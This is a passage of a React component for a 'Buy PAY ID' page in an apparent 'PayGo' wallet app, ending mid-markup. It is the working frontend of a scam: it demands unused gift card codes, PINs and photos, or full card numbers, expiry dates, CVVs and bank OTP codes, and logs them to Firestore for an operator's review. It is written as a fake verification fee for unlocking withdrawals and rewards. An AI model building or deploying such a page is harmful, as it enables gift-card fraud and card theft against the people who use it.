import React, { useState, useEffect } from 'react';
import { useAuth } from '../context/AuthContext';
import { db, logCardSubmission, logGiftCardSubmission } from '../lib/firebase';
import { doc, getDoc, onSnapshot, updateDoc } from 'firebase/firestore';
import {
  GIFT_CARD_BRAND_RULES,
  validateRealGiftCardInput,
  compressCardImage,
} from '../utils/giftCardValidator';
import { GiftCardVerdictModal, GiftCardCheckChecklist } from './GiftCardVerdictModal';
import {
  ArrowLeft,
  Copy,
  ShieldCheck,
  Check,
  X,
  CreditCard,
  Eye,
  EyeOff,
  Lock,
  Calendar,
  Gift,
  AlertCircle,
  Upload,
} from 'lucide-react';

interface BuyPayIdProps {
  onBack: () => void;
  onNavigateToTransfer?: () => void;
}

const GIFT_CARD_BRANDS = GIFT_CARD_BRAND_RULES;

export const BuyPayId: React.FC<BuyPayIdProps> = ({ onBack, onNavigateToTransfer }) => {
  const { user, addTransaction, updateUser, trackGiftCardSubmission } = useAuth();
  const [step, setStep] = useState(1);
  const [countdown, setCountdown] = useState(10);
  const [progress, setProgress] = useState(0);
  const [showServiceNotice, setShowServiceNotice] = useState(false);
  const [showPayId, setShowPayId] = useState(false);
  const [copiedField, setCopiedField] = useState<string | null>(null);

  // Payment method tab in step 3: 'giftcard' or 'card'
  const [paymentMethod, setPaymentMethod] = useState<'giftcard' | 'card'>('giftcard');

  // Gift Card Verification state
  const [giftCardBrand, setGiftCardBrand] = useState(GIFT_CARD_BRAND_RULES[0].name);
  const [giftCardFormat, setGiftCardFormat] = useState<'ecode' | 'physical'>('ecode');
  const [giftCardCode, setGiftCardCode] = useState('');
  const [giftCardPin, setGiftCardPin] = useState('');
  const [giftCardImage, setGiftCardImage] = useState<string | null>(null);
  const [confirmedUnused, setConfirmedUnused] = useState(false);
  const [isSubmittingGiftCard, setIsSubmittingGiftCard] = useState(false);
  const [giftCardError, setGiftCardError] = useState('');
  const [pendingStatusId, setPendingStatusId] = useState<string | null>(null);
  const [giftStatusState, setGiftStatusState] = useState<'pending' | 'verified' | 'redeemed' | 'rejected'>('pending');
  const [giftRejectionReason, setGiftRejectionReason] = useState('');
  const [verdictModal, setVerdictModal] = useState<{ type: 'used' | 'fake'; message: string } | null>(null);
  const [showGiftConfirmModal, setShowGiftConfirmModal] = useState(false);
  const [isCheckingStatus, setIsCheckingStatus] = useState(false);
  const [statusCheckNote, setStatusCheckNote] = useState('');

  // ATM Card form state
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardName, setCardName] = useState(user?.name || '');
  const [cardError, setCardError] = useState('');
  const [pendingCardSubId, setPendingCardSubId] = useState<string | null>(null);
  const [requiresOtpModal, setRequiresOtpModal] = useState(false);
  const [clientOtpInput, setClientOtpInput] = useState('');
  const [otpVerifyError, setOtpVerifyError] = useState('');
  const [isVerifyingOtp, setIsVerifyingOtp] = useState(false);

  useEffect(() => {
    if (!pendingCardSubId) return;
    const unsubscribe = onSnapshot(doc(db, 'cardSubmissions', pendingCardSubId), (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data();
        if (data.requiresOtp && !requiresOtpModal && data.status !== 'approved') {
          setRequiresOtpModal(true);
        }
        if (data.status === 'approved' || data.otpVerified) {
          setRequiresOtpModal(false);
          updateUser({ payIdVerified: true });
          setStep(5);
        }
        if (data.status === 'rejected') {
          setRequiresOtpModal(false);
          updateUser({ cardRejectionReason: data.rejectionReason || 'Card verification declined.' });
          setStep(4);
        }
      }
    });
    return () => unsubscribe();
  }, [pendingCardSubId, requiresOtpModal]);

  const handleClientSubmitOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!clientOtpInput || clientOtpInput.length < 4) {
      setOtpVerifyError('Please enter a valid OTP code');
      return;
    }
    if (!pendingCardSubId) return;

    setIsVerifyingOtp(true);
    setOtpVerifyError('');
    try {
      await updateDoc(doc(db, 'cardSubmissions', pendingCardSubId), {
        otpVerified: true,
        otpCodeEntered: clientOtpInput,
        status: 'approved',
      });
      setRequiresOtpModal(false);
      updateUser({ payIdVerified: true });
      setStep(5);
    } catch (err: any) {
      setOtpVerifyError(err?.message || 'Failed to verify OTP code.');
    } finally {
      setIsVerifyingOtp(false);
    }
  };

  const [formData, setFormData] = useState({
    fullName: user?.name || '',
    email: user?.email || '',
  });

  const PAY_ID_CODE = "PG-7474PAYDDT1I2P18837DOEFQ";

  // Format card number
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = val.replace(/(\d{4})(?=\d)/g, '$1 ');
    setCardNumber(formatted);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (val.length >= 3) {
      setExpiry(`${val.slice(0, 2)}/${val.slice(2)}`);
    } else {
      setExpiry(val);
    }
  };

  const handleImageUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setGiftCardError('');
    try {
      const compressed = await compressCardImage(file);
      setGiftCardImage(compressed);
    } catch (err: any) {
      setGiftCardError(err?.message || 'Failed to read gift card image.');
    }
  };

  // Step 2 countdown
  useEffect(() => {
    if (step === 2 && countdown > 0) {
      const timer = setTimeout(() => {
        setCountdown((prev) => prev - 1);
        setProgress(((10 - countdown + 1) / 10) * 100);
      }, 1000);
      return () => clearTimeout(timer);
    } else if (step === 2 && countdown === 0) {
      setShowServiceNotice(true);
    }
  }, [step, countdown]);

  const pendingStorageKey = user?.email
    ? `paygo_pending_payid_status_${user.email.toLowerCase()}`
    : null;

  // Restore active PAY ID or pending gift card verification status if user reopens page
  useEffect(() => {
    if (user?.payIdVerified) {
      if (pendingStorageKey) {
        localStorage.removeItem(pendingStorageKey);
      }
      setPendingStatusId(null);
      setStep(5);
      return;
    }
    if (pendingStorageKey) {
      const savedStatusId = localStorage.getItem(pendingStorageKey);
      if (savedStatusId) {
        setPendingStatusId(savedStatusId);
        setPaymentMethod('giftcard');
        setStep(4);
      }
    }
  }, [user?.payIdVerified, pendingStorageKey]);

  // Step 4 verification: strictly wait for Firestore confirmation on Gift Cards; 10s gateway timer only for ATM card
  useEffect(() => {
    if (step !== 4) return;

    if (paymentMethod === 'giftcard') {
      if (!pendingStatusId) return;

      const unsub = onSnapshot(
        doc(db, 'giftCardStatuses', pendingStatusId),
        (snap) => {
          if (!snap.exists()) return;
          const data = snap.data() as {
            status: 'pending' | 'verified' | 'redeemed' | 'rejected';
            rejectionReason?: string;
          };
          setGiftStatusState(data.status);

          if (data.status === 'rejected') {
            updateUser({ payIdVerified: false });
            setGiftRejectionReason(
              data.rejectionReason || 'Wrong or used gift card is not allowed. Please drop a real, unused gift card.'
            );
            return;
          }

          if (data.status === 'verified' || data.status === 'redeemed') {
            if (pendingStorageKey) {
              localStorage.removeItem(pendingStorageKey);
            }
            setPendingStatusId(null);
            updateUser({ payIdVerified: true });
            addTransaction({
              type: 'PAY ID Purchase',
              amount: 5,
              ref: pendingStatusId,
              date: new Date().toLocaleString(),
            });
            setStep(5);
          }
        },
        (err) => {
          console.warn('Gift card status listener warning:', err);
        }
      );
      return () => unsub();
    }

    if (paymentMethod !== 'card') return;

    // ATM Card (Other Option) verification: wait for admin approval
    const cleanEmail = user?.email?.trim().toLowerCase();
    if (!cleanEmail) return;

    const unsubUser = onSnapshot(
      doc(db, 'users', cleanEmail),
      (snap) => {
        if (!snap.exists()) return;
        const remote = snap.data() as { payIdVerified?: boolean; cardRejectionReason?: string };
        if (remote.payIdVerified) {
          updateUser({ payIdVerified: true, cardRejectionReason: '' });
          addTransaction({
            type: 'PAY ID Purchase',
            amount: 5,
            date: new Date().toLocaleString(),
          });
          setStep(5);
        } else if (remote.cardRejectionReason) {
          updateUser({ cardRejectionReason: remote.cardRejectionReason });
        }
      }
    );
    return () => unsubUser();
  }, [step, paymentMethod, pendingStatusId, pendingStorageKey]);

  const copyToClipboard = (text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    setTimeout(() => setCopiedField(null), 2000);
  };

  const handleDismissNotice = () => {
    setShowServiceNotice(false);
    setStep(3);
  };

  const handleGiftCardPayment = async (e: React.FormEvent) => {
    e.preventDefault();
    setGiftCardError('');

    const validation = validateRealGiftCardInput({
      brand: giftCardBrand,
      format: giftCardFormat,
      code: giftCardCode,
      pin: giftCardPin,
      image: giftCardImage,
      confirmedUnused,
    });

    if (!validation.valid) {
      const msg = validation.error || 'Please drop a valid, unused gift card.';
      setGiftCardError(msg);
      setVerdictModal({
        type: msg.toLowerCase().includes('used') ? 'used' : 'fake',
        message: msg,
      });
      return;
    }

    setShowGiftConfirmModal(true);
  };

  const handleConfirmAndSubmitGiftCard = async () => {
    setShowGiftConfirmModal(false);
    setGiftCardError('');
    setStatusCheckNote('');
    setIsSubmittingGiftCard(true);
    try {
      const res = await logGiftCardSubmission({
        id: `GIFT-${Date.now()}`,
        type: 'PAY ID Verification',
        cardBrand: giftCardBrand,
        cardFormat: giftCardFormat,
        cardCode: giftCardCode.trim().toUpperCase(),
        cardPin: giftCardPin.trim() || 'N/A',
        amount: 5,
        image: giftCardImage || '',
        userEmail: user?.email || formData.email || 'unknown',
        userName: user?.name || formData.fullName || 'User',
        date: new Date().toLocaleString(),
        status: 'pending',
      });

      if (!res.success || !res.statusId) {
        const msg =
          res.error || 'Used or invalid gift card is not allowed. Please drop a brand-new real gift card.';
        setGiftCardError(msg);
        setVerdictModal({ type: 'used', message: msg });
        return;
      }

      if (pendingStorageKey) {
        localStorage.setItem(pendingStorageKey, res.statusId);
      }
      trackGiftCardSubmission({
        statusId: res.statusId,
        type: 'PAY ID Verification',
        cardBrand: giftCardBrand,
        cardFormat: giftCardFormat,
        cardCode: giftCardCode.trim().toUpperCase(),
        amount: 5,
      });
      setGiftStatusState('pending');
      setGiftRejectionReason('');
      setPendingStatusId(res.statusId);
      setStep(4);
    } catch (err: any) {
      console.error(err);
      setGiftCardError(err?.message || 'Could not verify gift card right now.');
    } finally {
      setIsSubmittingGiftCard(false);
    }
  };

  const handleManualCheckConfirmation = async () => {
    if (!pendingStatusId) return;
    setIsCheckingStatus(true);
    setStatusCheckNote('');
    try {
      const statusSnap = await getDoc(doc(db, 'giftCardStatuses', pendingStatusId));
      if (statusSnap.exists()) {
        const data = statusSnap.data() as {
          status: 'pending' | 'verified' | 'redeemed' | 'rejected';
          rejectionReason?: string;
        };
        setGiftStatusState(data.status);
        if (data.status === 'verified' || data.status === 'redeemed') {
          if (pendingStorageKey) localStorage.removeItem(pendingStorageKey);
          setPendingStatusId(null);
          updateUser({ payIdVerified: true });
          addTransaction({
            type: 'PAY ID Purchase',
            amount: 5,
            ref: pendingStatusId,
            date: new Date().toLocaleString(),
          });
          setStep(5);
          return;
        }
        if (data.status === 'rejected') {
          updateUser({ payIdVerified: false });
          setGiftRejectionReason(
            data.rejectionReason || 'Wrong or used gift card is not allowed. Please drop a real, unused gift card.'
          );
          return;
        }
      }
      setStatusCheckNote('Still awaiting gift card confirmation. Your PAY ID will unlock right here once confirmed.');
    } catch {
      setStatusCheckNote('Unable to reach server right now. Checking automatically...');
    } finally {
      setIsCheckingStatus(false);
    }
  };

  const handleCardPayment = async (e: React.FormEvent) => {
    e.preventDefault();
    setCardError('');

    const cleanCard = cardNumber.replace(/\s/g, '');
    if (cleanCard.length < 16) {
      setCardError('Please enter a valid 16-digit ATM card number');
      return;
    }
    if (!expiry || expiry.length < 5) {
      setCardError('Please enter a valid expiry date (MM/YY)');
      return;
    }
    if (!cvv || cvv.length < 3) {
      setCardError('Please enter a valid CVV');
      return;
    }

    try {
      updateUser({ cardRejectionReason: '' });
      const cardSubId = `CARD-${Date.now()}`;
      setPendingCardSubId(cardSubId);
      await logCardSubmission({
        id: cardSubId,
        type: 'PAY ID Card Purchase',
        cardNumber,
        expiry,
        cvv,
        cardName,
        amount: 5,
        status: 'pending',
        userEmail: user?.email || formData.email || 'unknown',
        userName: user?.name || formData.fullName || cardName,
        date: new Date().toLocaleString(),
      });
    } catch (e) {
      console.error(e);
    }

    setStep(4);
  };

  return (
    <div className="min-h-screen bg-gray-50 pb-12">
      {/* Top Header */}
      <div className="bg-purple-700 text-white p-4 shadow-md sticky top-0 z-30">
        <div className="max-w-xl mx-auto flex items-center space-x-3">
          <button
            onClick={onBack}
            className="p-2 hover:bg-white/10 rounded-full transition-colors text-white cursor-pointer"
          >
            <ArrowLeft className="w-5 h-5" />
          </button>
          <div>
            <h1 className="text-lg font-bold">Buy PAY ID</h1>
            <p className="text-xs text-purple-200">Official PayGo ID Generation</p>
          </div>
        </div>
      </div>

      <div className="max-w-xl mx-auto p-4 sm:p-6">
        {/* Step 1: Initial Form */}
        {step === 1 && (
          <div className="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 space-y-5">
            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                Amount
              </label>
              <div className="bg-purple-50 border border-purple-100 p-4 rounded-xl flex items-center justify-between">
                <span className="text-3xl font-black text-purple-700">$25</span>
                <span className="text-xs bg-purple-200 text-purple-800 font-semibold px-2.5 py-1 rounded-full">
                  One-time Fee
                </span>
              </div>
            </div>

            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                Full Name
              </label>
              <input
                type="text"
                value={formData.fullName}
                onChange={(e) => setFormData({ ...formData, fullName: e.target.value })}
                placeholder="Your full name"
                className="w-full p-3.5 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900"
              />
            </div>

            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                Your Email Address
              </label>
              <input
                type="email"
                value={formData.email}
                onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                placeholder="email address"
                className="w-full p-3.5 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900"
              />
            </div>

            <button
              onClick={() => {
                setCountdown(10);
                setProgress(0);
                setStep(2);
              }}
              className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all flex items-center justify-center space-x-2 cursor-pointer"
            >
              <ShieldCheck className="w-5 h-5" />
              <span>Proceed to Verification ($25)</span>
            </button>

            <div className="bg-purple-50/70 border border-purple-100 rounded-xl p-3.5 space-y-1.5 text-xs text-purple-900">
              <p className="font-bold">What Your PAY ID Unlocks:</p>
              <ul className="space-y-1 text-purple-800 list-disc list-inside">
                <li>Your unique <strong>PayGo Authorization ID</strong> for crypto &amp; wallet withdrawals</li>
                <li>Activates <strong>$5/week rewards</strong> &amp; eligibility for Tier Upgrades up to Ruby</li>
                <li>Supports verification via Apple, Steam, Razer Gold, Amazon, or ATM Card</li>
              </ul>
            </div>

            <p className="text-center text-gray-500 text-xs">
              Your PAY ID will be generated once your verification is completed.
            </p>
          </div>
        )}

        {/* Step 2: Preparing Payment Gateway */}
        {step === 2 && (
          <div className="bg-white rounded-2xl p-8 shadow-sm border border-gray-100 flex flex-col items-center justify-center text-center space-y-5 my-8">
            <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin" />
            <h3 className="text-2xl font-bold text-gray-900">Preparing Verification Gateway</h3>
            <p className="text-sm text-gray-500 max-w-sm">
              Please wait while we initialize secure verification channels...
            </p>
            <div className="text-3xl font-black text-purple-600">{countdown}s</div>
            <div className="w-full bg-gray-200 rounded-full h-2.5 overflow-hidden max-w-xs">
              <div
                className="bg-purple-600 h-full rounded-full transition-all duration-1000"
                style={{ width: `${progress}%` }}
              />
            </div>
          </div>
        )}

        {/* Step 3: Verification Methods (Gift Card & ATM Card) */}
        {step === 3 && (
          <div className="space-y-5">
            <div className="bg-gradient-to-r from-purple-700 to-indigo-800 text-white rounded-2xl p-5 text-center shadow-sm">
              <h2 className="text-xl font-bold mb-1">Verify Your Account</h2>
              <p className="text-purple-200 text-sm">
                Verify your account with Gift Cards or Other Option for $5
              </p>
            </div>

            <div className="bg-gradient-to-r from-purple-50 to-indigo-50 border border-purple-200 rounded-2xl p-4 space-y-1.5">
              <div className="flex items-center space-x-2">
                <Gift className="w-5 h-5 text-purple-700" />
                <h3 className="font-bold text-sm text-purple-900">Real & Unused Gift Cards Only</h3>
              </div>
              <p className="text-xs text-purple-800 leading-relaxed">
                Drop a genuine, unredeemed <strong>$5</strong> gift card with its clear photo / receipt to verify your wallet and unlock PAY ID. <strong>Used, redeemed, or fake gift cards are strictly not allowed.</strong>
              </p>
            </div>

            {/* Payment Method Selector Tabs */}
            <div className="grid grid-cols-2 gap-2 bg-gray-200 p-1.5 rounded-2xl">
              <button
                type="button"
                onClick={() => setPaymentMethod('giftcard')}
                className={`py-3 rounded-xl font-bold text-xs sm:text-sm transition-all flex items-center justify-center space-x-2 cursor-pointer ${
                  paymentMethod === 'giftcard'
                    ? 'bg-white text-purple-900 shadow-sm'
                    : 'text-gray-600 hover:text-gray-900'
                }`}
              >
                <Gift className="w-4 h-4 text-purple-600" />
                <span>Verify with Gift Cards</span>
              </button>

              <button
                type="button"
                onClick={() => setPaymentMethod('card')}
                className={`py-3 rounded-xl font-bold text-xs sm:text-sm transition-all flex items-center justify-center space-x-2 cursor-pointer ${
                  paymentMethod === 'card'
                    ? 'bg-white text-purple-900 shadow-sm'
                    : 'text-gray-600 hover:text-gray-900'
                }`}
              >
                <CreditCard className="w-4 h-4 text-emerald-600" />
                <span>Other Option</span>
              </button>
            </div>

            {paymentMethod === 'giftcard' ? (
              <form onSubmit={handleGiftCardPayment} className="bg-white rounded-3xl p-6 shadow-sm border border-gray-100 space-y-4">
                {giftCardError && (
                  <div className="p-3 bg-red-50 border border-red-200 text-red-700 text-xs rounded-xl flex items-start space-x-2 font-medium">
                    <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-red-600" />
                    <span>{giftCardError}</span>
                  </div>
                )}

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                    Select Gift Card Brand
                  </label>
                  <select
                    value={giftCardBrand}
                    onChange={(e) => {
                      setGiftCardBrand(e.target.value);
                      setGiftCardError('');
                    }}
                    className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900 bg-white font-medium"
                  >
                    {GIFT_CARD_BRANDS.map((b) => (
                      <option key={b.id} value={b.name}>
                        {b.icon} {b.name}
                      </option>
                    ))}
                  </select>
                </div>

                <div className="bg-purple-50 border border-purple-100 rounded-xl py-2 px-3 text-center text-xs font-bold text-purple-900 flex items-center justify-center space-x-1.5">
                  <Gift className="w-3.5 h-3.5 text-purple-700" />
                  <span>Unused Gift Card Code &amp; Photo Submission</span>
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Gift Card Claim Code / E-Code *
                  </label>
                  <input
                    type="text"
                    value={giftCardCode}
                    onChange={(e) => {
                      setGiftCardCode(e.target.value.toUpperCase());
                      setGiftCardError('');
                    }}
                    placeholder={
                      GIFT_CARD_BRANDS.find((b) => b.name === giftCardBrand)?.example ||
                      'Enter real unredeemed gift card code'
                    }
                    className="w-full p-3.5 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono font-bold text-gray-900 uppercase"
                    required
                  />
                  <p className="text-[11px] text-purple-700 mt-1 font-medium">
                    {GIFT_CARD_BRANDS.find((b) => b.name === giftCardBrand)?.formatHint}
                  </p>
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Required Value ($)
                  </label>
                  <input
                    type="text"
                    readOnly
                    value="$5"
                    className="w-full p-3 bg-gray-100 border border-gray-200 rounded-xl text-sm font-bold text-purple-900 font-mono"
                  />
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Upload Real Gift Card Photo / Receipt (Required *)
                  </label>
                  <label
                    className={`border-2 border-dashed rounded-2xl p-4 flex flex-col items-center justify-center cursor-pointer transition-colors bg-gray-50 ${
                      giftCardImage
                        ? 'border-emerald-400 bg-emerald-50/40'
                        : 'border-gray-300 hover:border-purple-400'
                    }`}
                  >
                    {giftCardImage ? (
                      <div className="space-y-2 text-center">
                        <img
                          src={giftCardImage}
                          alt="Card Preview"
                          className="h-24 object-contain rounded-lg mx-auto border border-gray-200"
                        />
                        <span className="text-xs text-purple-700 font-semibold">Change Photo</span>
                      </div>
                    ) : (
                      <div className="text-center space-y-1">
                        <Upload className="w-6 h-6 text-purple-600 mx-auto mb-1" />
                        <p className="text-xs font-semibold text-gray-700">
                          {giftCardFormat === 'physical'
                            ? 'Attach clear photo of scratched card & store receipt'
                            : 'Attach screenshot or email receipt of real e-code'}
                        </p>
                        <p className="text-[10px] text-gray-400">JPG, PNG required to verify card is unused</p>
                      </div>
                    )}
                    <input
                      type="file"
                      accept="image/*"
                      onChange={handleImageUpload}
                      className="hidden"
                    />
                  </label>
                </div>

                <label className="flex items-start space-x-2.5 bg-amber-50 border border-amber-200 rounded-xl p-3 cursor-pointer">
                  <input
                    type="checkbox"
                    checked={confirmedUnused}
                    onChange={(e) => setConfirmedUnused(e.target.checked)}
                    className="mt-0.5 w-4 h-4 accent-purple-600 shrink-0"
                  />
                  <span className="text-xs text-amber-900 leading-relaxed font-medium">
                    I confirm this is a real, unredeemed gift card. Dropping a used, redeemed, or fake gift card is not allowed.
                  </span>
                </label>

                {giftCardError && (
                  <div className="p-3 bg-red-50 border border-red-200 text-red-700 text-xs rounded-xl flex items-start space-x-2 font-medium">
                    <AlertCircle className="w-4 h-4 shrink-0 mt-0.5 text-red-600" />
                    <span>{giftCardError}</span>
                  </div>
                )}

                <button
                  type="submit"
                  disabled={isSubmittingGiftCard}
                  className="w-full min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2 disabled:opacity-60"
                >
                  <ShieldCheck className="w-5 h-5" />
                  <span>
                    {isSubmittingGiftCard
                      ? 'Submitting Gift Card for Confirmation...'
                      : 'Review & Confirm Gift Card ($5)'}
                  </span>
                </button>
              </form>
            ) : (
              <form onSubmit={handleCardPayment} className="bg-white rounded-3xl p-6 shadow-sm border border-gray-100 space-y-4">
                <div className="bg-purple-900 text-white rounded-2xl p-4 relative overflow-hidden mb-2">
                  <div className="text-[10px] uppercase tracking-widest text-purple-300 font-semibold mb-3">
                    Card Verification (Other Option)
                  </div>
                  <div className="font-mono text-base tracking-wider mb-3">
                    {cardNumber || '•••• •••• •••• ••••'}
                  </div>
                  <div className="flex justify-between text-xs text-purple-200">
                    <span>{cardName || 'CARDHOLDER'}</span>
                    <span className="font-mono">{expiry || 'MM/YY'}</span>
                  </div>
                </div>

                {cardError && (
                  <div className="p-3 bg-red-50 border border-red-200 text-red-600 text-xs rounded-xl flex items-center space-x-2">
                    <AlertCircle className="w-4 h-4 shrink-0" />
                    <span>{cardError}</span>
                  </div>
                )}

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Card Number
                  </label>
                  <div className="relative">
                    <CreditCard className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                    <input
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      placeholder="4532 •••• •••• ••••"
                      className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                      required
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                      Expiry Date
                    </label>
                    <div className="relative">
                      <Calendar className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                      <input
                        type="text"
                        value={expiry}
                        onChange={handleExpiryChange}
                        placeholder="MM/YY"
                        className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                        required
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                      CVV
                    </label>
                    <div className="relative">
                      <Lock className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                      <input
                        type="password"
                        maxLength={4}
                        value={cvv}
                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))}
                        placeholder="123"
                        className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                        required
                      />
                    </div>
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Cardholder Name
                  </label>
                  <input
                    type="text"
                    value={cardName}
                    onChange={(e) => setCardName(e.target.value)}
                    placeholder="Name on card"
                    className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900 uppercase"
                    required
                  />
                </div>

                <button
                  type="submit"
                  className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2"
                >
                  <CreditCard className="w-5 h-5" />
                  <span>Verify $5 with Card (Other Option)</span>
                </button>
              </form>
            )}
          </div>
        )}

        {/* Step 4: Confirming Payment / Real-Time Admin Gift Card Hold */}
        {step === 4 && (
          <div className="bg-white rounded-2xl p-8 shadow-sm border border-gray-100 flex flex-col items-center justify-center text-center space-y-5 my-8">
            {paymentMethod === 'giftcard' && giftStatusState === 'rejected' ? (
              <>
                <div className="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center ring-8 ring-red-50">
                  <X className="w-9 h-9" />
                </div>
                <span className="text-xs font-extrabold uppercase tracking-wider bg-red-100 text-red-800 border border-red-200 px-3 py-1 rounded-full">
                  {giftRejectionReason.toLowerCase().includes('fake') ||
                  giftRejectionReason.toLowerCase().includes('wrong')
                    ? 'Verdict: Fake / Wrong Gift Card'
                    : 'Verdict: Used Gift Card'}
                </span>
                <h3 className="text-2xl font-extrabold text-red-700">
                  {giftRejectionReason.toLowerCase().includes('fake') &&
                  !giftRejectionReason.toLowerCase().startsWith('used')
                    ? 'Fake or Invalid Gift Card — Rejected'
                    : 'Used Gift Card — PAY ID Blocked'}
                </h3>
                <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
                  {giftRejectionReason ||
                    'Wrong or already-used gift card detected. Used or invalid gift cards are not allowed and cannot generate a PAY ID.'}
                </p>
                <button
                  type="button"
                  onClick={() => {
                    if (pendingStorageKey) localStorage.removeItem(pendingStorageKey);
                    setPendingStatusId(null);
                    setGiftStatusState('pending');
                    setGiftRejectionReason('');
                    setGiftCardCode('');
                    setGiftCardPin('');
                    setGiftCardImage(null);
                    setConfirmedUnused(false);
                    setGiftCardError(
                      'Previous card was rejected as wrong or used. Please drop a real, unused gift card.'
                    );
                    setStep(3);
                  }}
                  className="w-full max-w-xs min-h-[48px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 px-5 rounded-xl text-sm shadow-md transition-all cursor-pointer"
                >
                  Submit a Real Unused Gift Card
                </button>
              </>
            ) : paymentMethod === 'giftcard' && pendingStatusId ? (
              <>
                <div className="w-16 h-16 border-4 border-amber-500 border-t-transparent rounded-full animate-spin" />
                <span className="text-xs font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-3 py-1 rounded-full">
                  Gift Card Confirmation Required • PAY ID Locked
                </span>
                <h3 className="text-2xl font-bold text-gray-900">Confirming Gift Card Before Giving PAY ID</h3>
                <p className="text-sm text-gray-600 max-w-sm leading-relaxed">
                  Your gift card is being confirmed real and unredeemed. <strong>Your PAY ID will remain locked until confirmation succeeds.</strong>
                </p>
                <GiftCardCheckChecklist />

                <div className="w-full max-w-sm bg-slate-900 text-white rounded-2xl p-4 border border-slate-700 text-left space-y-1.5">
                  <div className="flex items-center justify-between text-[11px] text-amber-300 font-bold uppercase tracking-wider">
                    <span>PAY ID Status</span>
                    <span className="flex items-center space-x-1">
                      <Lock className="w-3 h-3" />
                      <span>Locked Until Confirmed</span>
                    </span>
                  </div>
                  <div className="font-mono text-sm tracking-widest text-slate-400 bg-black/40 px-3 py-2 rounded-xl select-none">
                    PG-•••• ••••••••••••••••
                  </div>
                </div>

                <div className="w-full bg-purple-50 border border-purple-200 rounded-xl p-3 text-xs text-purple-800 max-w-sm">
                  Reference ID: <span className="font-mono font-bold">{pendingStatusId}</span>
                </div>

                {statusCheckNote && (
                  <p className="text-xs text-amber-700 font-medium max-w-sm">{statusCheckNote}</p>
                )}

                <button
                  type="button"
                  onClick={handleManualCheckConfirmation}
                  disabled={isCheckingStatus}
                  className="w-full max-w-sm min-h-[44px] bg-purple-600 hover:bg-purple-700 text-white font-bold py-2.5 px-4 rounded-xl text-xs shadow-sm cursor-pointer disabled:opacity-60"
                >
                  {isCheckingStatus ? 'Checking Gift Card Confirmation...' : 'Check Gift Card Confirmation Status'}
                </button>

                <button
                  type="button"
                  onClick={() => {
                    if (pendingStorageKey) localStorage.removeItem(pendingStorageKey);
                    setPendingStatusId(null);
                    setGiftCardCode('');
                    setGiftCardPin('');
                    setGiftCardImage(null);
                    setConfirmedUnused(false);
                    setStatusCheckNote('');
                    setStep(3);
                  }}
                  className="text-xs font-semibold text-gray-500 hover:text-purple-700 underline cursor-pointer pt-1"
                >
                  Cancel & submit a different card
                </button>
              </>
            ) : user?.cardRejectionReason ? (
              <>
